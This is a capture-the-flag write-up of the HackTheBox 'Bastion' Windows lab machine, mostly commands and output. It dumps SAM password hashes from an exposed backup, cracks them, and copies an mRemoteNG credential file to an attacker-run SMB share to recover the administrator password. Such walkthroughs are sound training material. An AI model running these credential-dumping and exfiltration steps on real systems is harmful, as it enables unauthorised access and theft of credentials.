---
title: "HTB: Bastion Write-up"
date: 2021-06-02 00:00:00 -0000
categories:
  - HTB
tags:
  - HTB
  - windows
---

Bastion is the next Windows box from TJNull's [list of OSCP-like HackTheBox machines][htb-list].

## Enumeration

I decided to continue keeping it simple and used `nmap`, instead of relying on [AutoRecon][autorecon].

```bash
nmap -p- -T4 -sSV -oA scans/bastion -v --version-all 10.10.10.134
```

Looking at the `nmap` results, it seems like this is a Windows Server 2008 host. The fact that its running SSH is interesting, but I'm going to start my enumeration with SMB.

```txt
22/tcp    open  ssh          OpenSSH for_Windows_7.9 (protocol 2.0)
135/tcp   open  msrpc        Microsoft Windows RPC
139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
5985/tcp  open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc        Microsoft Windows RPC
49665/tcp open  msrpc        Microsoft Windows RPC
49666/tcp open  msrpc        Microsoft Windows RPC
49667/tcp open  msrpc        Microsoft Windows RPC
49668/tcp open  msrpc        Microsoft Windows RPC
49669/tcp open  msrpc        Microsoft Windows RPC
49670/tcp open  msrpc        Microsoft Windows RPC
```

Just like in the "Active" writeup, I'm going to use [smbmap][smbmap] to enumerate the SMB shares on the host, making sure to set the recursion level to a suitable depth. For some reason, I needed to explicitly specify the `null` username and empty password.

```bash
$ smbmap -u null -p "" -H 10.10.10.134 -P 445 -R --depth=20
...

[+] Guest session    IP: 10.10.10.134:445 Name: 10.10.10.134
        Disk                                                   Permissions Comment
 ----                                                   ----------- -------
 ADMIN$                                             NO ACCESS Remote Admin
 Backups                                            READ, WRITE
 .\Backups\*
 dr--r--r--                0 Thu May 20 21:29:22 2021 .
 dr--r--r--                0 Thu May 20 21:29:22 2021 ..
 dr--r--r--                0 Thu May 20 21:23:43 2021 CQTVWIRAMF
 dr--r--r--                0 Thu May 20 21:29:22 2021 MOPNUQGHGA
 fr--r--r--              260 Thu May 20 21:24:44 2021 nmap-test-file
 fw--w--w--              116 Tue Apr 16 07:43:19 2019 note.txt
 dr--r--r--                0 Thu May 20 21:23:46 2021 PFICJEBHRW
 fr--r--r--                0 Fri Feb 22 07:43:28 2019 SDT65CB.tmp
 dr--r--r--                0 Fri Feb 22 07:44:02 2019 WindowsImageBackup
 .\Backups\WindowsImageBackup\*
 dr--r--r--                0 Fri Feb 22 07:44:02 2019 .
 dr--r--r--                0 Fri Feb 22 07:44:02 2019 ..
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 L4mpje-PC
 .\Backups\WindowsImageBackup\L4mpje-PC\*
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 .
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 ..
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 Backup 2019-02-22 124351
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 Catalog
 fr--r--r--               16 Fri Feb 22 07:44:02 2019 MediaId
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 SPPMetadataCache
 .\Backups\WindowsImageBackup\L4mpje-PC\Backup 2019-02-22 124351\*
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 .
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 ..
 fr--r--r--         37761024 Fri Feb 22 07:44:03 2019 9b9cfbc3-369e-11e9-a17c-806e6f6e6963.vhd
 fr--r--r--       5418299392 Fri Feb 22 07:45:32 2019 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd
 fr--r--r--             1186 Fri Feb 22 07:45:32 2019 BackupSpecs.xml
 fr--r--r--             1078 Fri Feb 22 07:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_AdditionalFilesc3b9f3c7-5e52-4d5e-8b20-19adc95a34c7.xml
 fr--r--r--             8930 Fri Feb 22 07:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Components.xml
 fr--r--r--             6542 Fri Feb 22 07:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_RegistryExcludes.xml
 fr--r--r--             2894 Fri Feb 22 07:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer4dc3bdd4-ab48-4d07-adb0-3bee2926fd7f.xml
 fr--r--r--             1488 Fri Feb 22 07:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writer542da469-d3e1-473c-9f4f-7847f01fc64f.xml
 fr--r--r--             1484 Fri Feb 22 07:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writera6ad56c2-b509-4e6c-bb19-49d8f43532f0.xml
 fr--r--r--             3844 Fri Feb 22 07:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerafbab4a2-367d-4d15-a586-71dbb18f8485.xml
 fr--r--r--             3988 Fri Feb 22 07:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writerbe000cbe-11fe-4426-9c58-531aa6355fc4.xml
 fr--r--r--             7110 Fri Feb 22 07:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writercd3f2362-8bef-46c7-9181-d62844cdc0b2.xml
 fr--r--r--          2374620 Fri Feb 22 07:45:32 2019 cd113385-65ff-4ea2-8ced-5630f6feca8f_Writere8132975-6f93-4464-a53e-1050253ae220.xml
 .\Backups\WindowsImageBackup\L4mpje-PC\Catalog\*
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 .
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 ..
 fr--r--r--             5698 Fri Feb 22 07:45:32 2019 BackupGlobalCatalog
 fr--r--r--             7440 Fri Feb 22 07:45:32 2019 GlobalCatalog
 .\Backups\WindowsImageBackup\L4mpje-PC\SPPMetadataCache\*
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 .
 dr--r--r--                0 Fri Feb 22 07:45:32 2019 ..
 fr--r--r--            57848 Fri Feb 22 07:45:32 2019 {cd113385-65ff-4ea2-8ced-5630f6feca8f}
 C$                                                 NO ACCESS Default share
 IPC$                                               READ ONLY Remote IPC
 .\IPC$\*
 fr--r--r--                3 Sun Dec 31 19:03:58 1600 InitShutdown
 fr--r--r--                4 Sun Dec 31 19:03:58 1600 lsass
 fr--r--r--                3 Sun Dec 31 19:03:58 1600 ntsvcs
 fr--r--r--                3 Sun Dec 31 19:03:58 1600 scerpc
 fr--r--r--                1 Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-2c8-0
 fr--r--r--                3 Sun Dec 31 19:03:58 1600 epmapper
 fr--r--r--                1 Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-1c4-0
 fr--r--r--                3 Sun Dec 31 19:03:58 1600 LSM_API_service
 fr--r--r--                3 Sun Dec 31 19:03:58 1600 eventlog
 fr--r--r--                1 Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-374-0
 fr--r--r--                3 Sun Dec 31 19:03:58 1600 atsvc
 fr--r--r--                1 Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-340-0
 fr--r--r--                4 Sun Dec 31 19:03:58 1600 wkssvc
 fr--r--r--                3 Sun Dec 31 19:03:58 1600 spoolss
 fr--r--r--                1 Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-5c0-0
 fr--r--r--                3 Sun Dec 31 19:03:58 1600 trkwks
 fr--r--r--                3 Sun Dec 31 19:03:58 1600 W32TIME_ALT
 fr--r--r--                1 Sun Dec 31 19:03:58 1600 openssh-ssh-agent
 fr--r--r--                1 Sun Dec 31 19:03:58 1600 vgauth-service
 fr--r--r--                4 Sun Dec 31 19:03:58 1600 srvsvc
 fr--r--r--                1 Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-238-0
 fr--r--r--                1 Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-580-0
 fr--r--r--                1 Sun Dec 31 19:03:58 1600 Winsock2\CatalogChangeListener-240-0
 fr--r--r--                3 Sun Dec 31 19:03:58 1600 winreg
```

### Mounting the Backup

Judging from the 'WindowsImageBackup' folder, I am assuming this is some sort of windows backup that is exposed. Furthermore, there is a `.vhd` file in the share, which stands for "Virtual Hard Disk". This is a format for full disk backups and is definitely worth inspecting. I want to mount the `.vhd` file without pulling it down locally through the HTB VPN, so I am going to mount the SMB share.

```bash
mount -t cifs //10.10.10.134/Backups ./mountpoint -o user=,password=,rw
```

And then mount the VHD using `guestmount`.

```bash
guestmount --add '/root/HTB/bastion/loot/mountpoint/WindowsImageBackup/L4mpje-PC/Backup 2019-02-22 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd' --inspector --ro /root/HTB/bastion/loot/fs -v
```

Now the windows file share should be mounted at `/root/HTB/bastion/loot/fs`, which we can verify with a quick `ls -la`.

```bash
$ ls -la
total 2096745
drwxrwxrwx 1 root root      12288 Feb 22  2019  .
drwxr-xr-x 4 root root       4096 May 20 22:32  ..
drwxrwxrwx 1 root root          0 Feb 22  2019 '$Recycle.Bin'
-rwxrwxrwx 1 root root         24 Jun 10  2009  autoexec.bat
-rwxrwxrwx 1 root root         10 Jun 10  2009  config.sys
lrwxrwxrwx 2 root root         14 Jul 14  2009 'Documents and Settings' -> /sysroot/Users
-rwxrwxrwx 1 root root 2147016704 Feb 22  2019  pagefile.sys
drwxrwxrwx 1 root root          0 Jul 13  2009  PerfLogs
drwxrwxrwx 1 root root       4096 Jul 14  2009  ProgramData
drwxrwxrwx 1 root root       4096 Apr 11  2011 'Program Files'
drwxrwxrwx 1 root root          0 Feb 22  2019  Recovery
drwxrwxrwx 1 root root       4096 Feb 22  2019 'System Volume Information'
drwxrwxrwx 1 root root       4096 Feb 22  2019  Users
drwxrwxrwx 1 root root      16384 Feb 22  2019  Windows
```

## Getting Shell Access

Now that we have access to the file system, the next step is to try use this access to get a shell somehow. Our `nmap` scan showed that this host has SSH for Windows enabled, so if we can get a password for any user on the system, then we should be able to SSH in.

### Dumping User Hashes From SAM Hive

Since we have unrestricted access to the underlying system, we can dump the local user's NTLM password hashes from the SAM registry hive using impacket's `secretsdump.py`.

```bash
$ cd /root/HTB/bastion/loot/fs/Windows/System32/config
$ impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY local
Impacket v0.9.23.dev1+20210127.141011.3673c588 - Copyright 2020 SecureAuth Corporation

[*] Target system bootKey: 0x8b56b2cb5033d8e2e289c26f8939a25f
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] DefaultPassword
(Unknown User):bureaulampje
[*] DPAPI_SYSTEM
dpapi_machinekey:0x32764bdcb45f472159af59f1dc287fd1920016a6
dpapi_userkey:0xd2e02883757da99914e3138496705b223e9d03dd
[*] Cleaning up...
```

`secretsdump.py` found that the default password is 'bureaulampje', but let's throw these hashes into JtR to see if it was able to get anything from them.

```bash
$ john --wordlist=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hashes.txt --format=NT
Using default input encoding: UTF-8
Loaded 2 password hashes with no different salts (NT [MD4 512/512 AVX512BW 16x3])
Remaining 1 password hash
Warning: no OpenMP support for this hash type, consider --fork=3
Press 'q' or Ctrl-C to abort, almost any other key for status
bureaulampje     (L4mpje)
1g 0:00:00:00 DONE (2021-06-01 16:58) 1.408g/s 13233Kp/s 13233Kc/s 13233KC/s burg7448..burcu.13
Warning: passwords printed above might not be all those cracked
Use the "--show --format=NT" options to display all of the cracked passwords reliably
Session completed
```

### Validating The Password

So it seems like the default password that `secretsdump.py` found was actually the password for the 'L4mpje' user. We can quickly confirm this using any number of tools, but I'm going to use my favorite windows exploitation swiss army knife, [CrackMapExec][cme].

```bash
$ cme smb 10.10.10.134 -u 'L4mpje' -p 'bureaulampje'
SMB         10.10.10.134    445    BASTION          [*] Windows Server 2016 Standard 14393 x64 (name:BASTION) (domain:Bastion) (signing:False) (SMBv1:True)
SMB         10.10.10.134    445    BASTION          [+] Bastion\L4mpje:bureaulampje
```

Looks like the creds are valid. We can now use them to get a shell through the exposed SSH service.

```bash
$ ssh L4mpje@10.10.10.134
L4mpje@10.10.10.134's password:
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

l4mpje@BASTION C:\Users\L4mpje>whoami
bastion\l4mpje
```

## Privilege Escalation

The first thing I like to do whenever I get a low privilege shell on a host is to run [winPEAS][linpeas]. There are a number of ways I could use to get the executable over to the victim host, but I decided to use impacket's `smbserver.py` to set up an SMB share that I could connect to. This just makes it easy to transfer files back and forth from the host without long-winded PowerShell commands.

### Setting Up An SMB Share

First step is to start the SMB share using impacket.

```bash
$ impacket-smbserver kali . -smb2support -user kali -password kali
Impacket v0.9.23.dev1+20210127.141011.3673c588 - Copyright 2020 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```

Then connect to it from the victim machine.

```cmd
l4mpje@BASTION C:\Users\L4mpje\Desktop>net use Z: \\10.10.14.29\kali /user:kali kali
Z: has a remembered connection to \\192.168.1.74\Backups. Do you
want to overwrite the remembered connection? (Y/N) [Y]: Y
The command completed successfully.

l4mpje@BASTION C:\Users\L4mpje\Desktop>dir Z:\
 Volume in drive Z has no label.
 Volume Serial Number is ABCD-EFAA

 Directory of Z:\

01-06-2021  22:56                85 link.sh
21-05-2021  04:07             2.030 tmp.xml
01-06-2021  23:15         1.678.336 winPEASx64.exe
               3 File(s)      1.680.451 bytes
               0 Dir(s)               0 bytes free
```

### Failing To Find System Information

I ran winPEASx64.exe and almost immediately I saw this error show up in the output.

```txt
[+] Basic System Information
   [?] Check if the Windows versions is vulnerable to some known exploit https://book.hacktricks.xyz/windows/windows-local-privi
lege-escalation#kernel-exploits
  [X] Exception: Access denied
  [X] Exception: Access denied
  [X] Exception: The given key was not present in the dictionary.
```

I wanted the system information to determine if there were any Windows exploits I could use to PrivEsc. I tried to manually determine the system information using `systeminfo`, but I was denied again.

```cmd
l4mpje@BASTION C:\Users\L4mpje\Desktop>systeminfo
ERROR: Access denied
```

### Enumerating Installed Programs

Looks like Windows exploits are probably not the intended path for PrivEsc. One of the next steps I took (while winPEAS was running) was seeing what programs were installed on the machine.

```cmd
l4mpje@BASTION C:\Program Files (x86)>dir
 Volume in drive C has no label.
 Volume Serial Number is 0CB3-C487

 Directory of C:\Program Files (x86)

22-02-2019  15:01    <DIR>          .
22-02-2019  15:01    <DIR>          ..
16-07-2016  15:23    <DIR>          Common Files
23-02-2019  10:38    <DIR>          Internet Explorer
16-07-2016  15:23    <DIR>          Microsoft.NET
22-02-2019  15:01    <DIR>          mRemoteNG
23-02-2019  11:22    <DIR>          Windows Defender
23-02-2019  10:38    <DIR>          Windows Mail
23-02-2019  11:22    <DIR>          Windows Media Player
16-07-2016  15:23    <DIR>          Windows Multimedia Platform
16-07-2016  15:23    <DIR>          Windows NT
23-02-2019  11:22    <DIR>          Windows Photo Viewer
16-07-2016  15:23    <DIR>          Windows Portable Devices
16-07-2016  15:23    <DIR>          WindowsPowerShell
               0 File(s)              0 bytes
              14 Dir(s)  11.293.147.136 bytes free
```

mRemoteNG is the only non-standard application in this folder, so it's worth looking into. While looking for mRemoteNG exploits, I came across [`mremoteng-decrypt`][mremoteng-decrypt], which clued me into the fact that this tool stores passwords in config files. It turns out that the program stores the username and password for connections in an encrypted file on disk, located at `C:\Users\<user>\AppData\Roaming\mRemoteNG\confCons.xml`. I copied this file over to my Kali machine...

```cmd
l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>copy confCons.xml Z:\
        1 file(s) copied.
```

... then took a look at it.

```xml
<?xml version="1.0" encoding="utf-8"?>
<mrng:Connections xmlns:mrng="http://mremoteng.org" Name="Connections" Export="false" EncryptionEngine="AES" BlockCipherMode="GCM" KdfIterations="1000" FullFileEncryption="false" Protected="ZSvKI7j224Gf/twXpaP5G2QFZMLr1iO1f5JKdtIKL6eUg+eWkL5tKO886au0ofFPW0oop8R8ddXKAx4KK7sAk6AA" ConfVersion="2.6">
    <Node Name="DC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="500e7d58-662a-44d4-aff0-3a4f547a3fee" Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==" Hostname="127.0.0.1" [...] />
    <Node Name="L4mpje-PC" Type="Connection" Descr="" Icon="mRemoteNG" Panel="General" Id="8d3579b2-e68e-48c1-8f0f-9ee1347c9128" Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB" Hostname="192.168.1.75" [...] />
</mrng:Connections>
```

I cut out most of it for brevity, but there are clearly two encrypted passwords stored in that file. I decided to test the tool against the 'L4mpje' user first to see if it would confirm what we know their password is.

```bash
$ python3 mremoteng_decrypt.py -s yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB
Password: bureaulampje
```

The tool managed to recover the correct password from the encrypted string, so next step was to run it against the 'Administrator' user's password.

```bash
$ python3 mremoteng_decrypt.py -s aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==
Password: thXLHM96BeKL0ER2
```

We can then try to SSH in using these credentials.

```bash
administrator@BASTION C:\Users\Administrator>whoami
bastion\administrator
```

And we have root! Thanks for reading.

[htb-list]: https://docs.google.com/spreadsheets/d/1dwSMIAPIam0PuRBkCiDI88pU3yzrqqHkDtBngUHNCw8/edit#gid=1839402159
[autorecon]: https://github.com/Tib3rius/AutoRecon
[bad-keys]: https://github.com/rapid7/ssh-badkeys
[linpeas]: https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite
[tty-shell]: https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#spawn-tty-shell
[smbmap]: https://github.com/ShawnDEvans/smbmap
[cpass]: https://adsecurity.org/?p=2288
[Bloodhound]: https://github.com/BloodHoundAD/BloodHound
[Bloodhound.py]: https://github.com/fox-it/BloodHound.py
[cme]: https://github.com/byt3bl33d3r/CrackMapExec
[mremoteng-decrypt]: https://github.com/kmahyyg/mremoteng-decrypt
